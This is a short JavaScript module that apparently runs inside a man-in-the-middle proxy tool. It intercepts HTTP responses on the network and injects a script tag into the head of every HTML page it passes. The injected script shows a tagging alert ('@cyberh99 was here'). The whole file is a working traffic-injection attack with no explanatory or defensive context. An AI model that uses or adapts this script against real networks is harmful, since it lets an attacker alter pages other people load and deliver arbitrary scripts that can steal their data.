function onLoad(){

 log("Script loaded..");

}

function onResponse(req,res){

	if (res.ContentType.indexOf('text/html') == 0){

		var body = res.ReadBody();
		
		res.Body = body.replace(
			'</head>',
			'<script type="text/javascript">alert(\"@cyberh99 was here\")</script></head>'
		);
	}

}
